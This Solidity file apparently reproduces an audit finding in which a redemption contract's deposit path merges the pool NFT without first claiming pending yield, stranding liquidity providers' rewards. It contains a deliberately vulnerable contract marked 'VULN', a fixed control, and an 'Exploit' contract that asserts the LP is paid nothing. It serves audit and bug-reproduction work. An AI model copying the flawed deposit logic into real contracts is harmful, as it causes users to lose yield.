// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  STBL Ess — pending LP yield destroyed in STBL_Redemption_Core::iDeposit
    (Cyfrin, 2026-06). iDeposit snapshots rewardIndex and merges the pool NFT
    without calling iClaimYield. disableYield parks the pending yield on the
    burned id, and claim(oldId) can never succeed. Existing LPs receive 0.
    The control calls iClaimYield first and pays the existing LP 100 yield.
*/

contract YieldToken {
    string public symbol = "YLD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YieldDistributor {
    YieldToken public token;
    mapping(uint256 => uint256) public pending;
    mapping(uint256 => uint256) public earned;
    mapping(uint256 => bool) public alive;

    constructor(YieldToken _token) {
        token = _token;
    }

    function enable(uint256 id) external {
        alive[id] = true;
    }

    function accrue(uint256 id, uint256 amount) external {
        token.mint(address(this), amount);
        pending[id] += amount;
    }

    function claim(uint256 id) external returns (uint256 amt) {
        require(alive[id], "ownerOf");
        amt = pending[id];
        pending[id] = 0;
        if (amt > 0) {
            token.transfer(msg.sender, amt);
        }
    }

    function disableYield(uint256 id) external {
        earned[id] += pending[id];
        pending[id] = 0;
        alive[id] = false;
    }
}

contract Splitter {
    YieldDistributor public dist;
    uint256 public nextId;

    constructor(YieldDistributor _dist) {
        dist = _dist;
        nextId = 10;
    }

    function merge(uint256 oldId, uint256 incoming) external returns (uint256 merged) {
        dist.disableYield(oldId);
        dist.disableYield(incoming);
        merged = ++nextId;
        dist.enable(merged);
    }
}

contract RedemptionCore {
    struct User {
        uint256 stableValueNet;
        uint256 rewardIndex;
        uint256 earned;
    }

    struct MetaDataStruct {
        uint256 stableValueNet;
    }

    mapping(address => User) public userData;
    MetaDataStruct internal MetaData;
    uint256 public rewardIndex;
    uint256 public totalSupply;
    uint256 public NFTID;
    YieldDistributor public dist;
    Splitter public spliter;
    YieldToken public token;
    address public lp;

    constructor(YieldToken _token, YieldDistributor _dist, Splitter _spliter) {
        token = _token;
        dist = _dist;
        spliter = _spliter;
    }

    function seed(address _lp, uint256 shares, uint256 nftId) external {
        lp = _lp;
        NFTID = nftId;
        dist.enable(nftId);
        userData[_lp].stableValueNet = shares;
        totalSupply = shares;
    }

    function deposit(uint256 id, uint256 stableValue) external {
        MetaData.stableValueNet = stableValue;
        dist.enable(id);
        iDeposit(id);
    }

    function iClaimYield() public returns (uint256 y) {
        y = dist.claim(NFTID);
        if (totalSupply > 0 && y > 0) {
            rewardIndex += (y * 1e18) / totalSupply;
        }
    }

    function _updateRewards(address user) internal {
        User storage u = userData[user];
        if (u.stableValueNet > 0 && rewardIndex > u.rewardIndex) {
            u.earned += (u.stableValueNet * (rewardIndex - u.rewardIndex)) / 1e18;
        }
        u.rewardIndex = rewardIndex;
    }

    function iDeposit(uint256 _id) internal {
        _updateRewards(msg.sender); // snapshot at stale rewardIndex
        // @> VULN: iDeposit never calls iClaimYield, so merge burns the pool NFT and strands its pending yield
        NFTID = spliter.merge(NFTID, _id); // burns old NFTID
        userData[msg.sender].stableValueNet += MetaData.stableValueNet;
        totalSupply += MetaData.stableValueNet;
    }

    function harvest(address user) external returns (uint256 paid) {
        _updateRewards(user);
        paid = userData[user].earned;
        userData[user].earned = 0;
        if (paid > 0) {
            token.transfer(user, paid);
        }
    }
}

contract RedemptionCoreFixed {
    struct User {
        uint256 stableValueNet;
        uint256 rewardIndex;
        uint256 earned;
    }

    struct MetaDataStruct {
        uint256 stableValueNet;
    }

    mapping(address => User) public userData;
    MetaDataStruct internal MetaData;
    uint256 public rewardIndex;
    uint256 public totalSupply;
    uint256 public NFTID;
    YieldDistributor public dist;
    Splitter public spliter;
    YieldToken public token;

    constructor(YieldToken _token, YieldDistributor _dist, Splitter _spliter) {
        token = _token;
        dist = _dist;
        spliter = _spliter;
    }

    function seed(address lp, uint256 shares, uint256 nftId) external {
        NFTID = nftId;
        dist.enable(nftId);
        userData[lp].stableValueNet = shares;
        totalSupply = shares;
    }

    function deposit(uint256 id, uint256 stableValue) external {
        MetaData.stableValueNet = stableValue;
        dist.enable(id);
        iDeposit(id);
    }

    function iClaimYield() public returns (uint256 y) {
        y = dist.claim(NFTID);
        if (totalSupply > 0 && y > 0) {
            rewardIndex += (y * 1e18) / totalSupply;
        }
    }

    function _updateRewards(address user) internal {
        User storage u = userData[user];
        if (u.stableValueNet > 0 && rewardIndex > u.rewardIndex) {
            u.earned += (u.stableValueNet * (rewardIndex - u.rewardIndex)) / 1e18;
        }
        u.rewardIndex = rewardIndex;
    }

    function iDeposit(uint256 _id) internal {
        if (totalSupply > 0) {
            iClaimYield();
        }
        _updateRewards(msg.sender);
        NFTID = spliter.merge(NFTID, _id);
        userData[msg.sender].stableValueNet += MetaData.stableValueNet;
        totalSupply += MetaData.stableValueNet;
    }

    function harvest(address user) external returns (uint256 paid) {
        _updateRewards(user);
        paid = userData[user].earned;
        userData[user].earned = 0;
        if (paid > 0) {
            token.transfer(user, paid);
        }
    }
}

contract Exploit {
    address public constant LP = address(uint160(0xB0B));
    uint256 public constant SHARES = 1000 ether;
    uint256 public constant YIELD = 100 ether;

    YieldToken public token;
    YieldDistributor public dist;
    Splitter public spliter;
    RedemptionCore public core;
    uint256 public oldNft;
    uint256 public lpPaid;
    bool public oldClaimable;

    constructor() {
        token = new YieldToken();
        dist = new YieldDistributor(token);
        spliter = new Splitter(dist);
        core = new RedemptionCore(token, dist, spliter);
        core.seed(LP, SHARES, 1);
    }

    function run() external {
        oldNft = core.NFTID();
        dist.accrue(oldNft, YIELD);
        uint256 pendingBefore = dist.pending(oldNft);
        core.deposit(2, SHARES);
        uint256 stranded = dist.earned(oldNft);
        uint256 pulled = core.iClaimYield();
        lpPaid = core.harvest(LP);
        try dist.claim(oldNft) returns (uint256) {
            oldClaimable = true;
        } catch {
            oldClaimable = false;
        }
        require(pendingBefore == YIELD, "accrued");
        require(stranded == YIELD, "stranded");
        require(pulled == 0, "pulled");
        require(lpPaid == 0, "lp paid");
        require(!oldClaimable, "claimable");
        require(token.balanceOf(address(dist)) == YIELD, "locked");
        require(core.rewardIndex() == 0, "index");
        require(core.NFTID() != oldNft, "nft");
    }
}
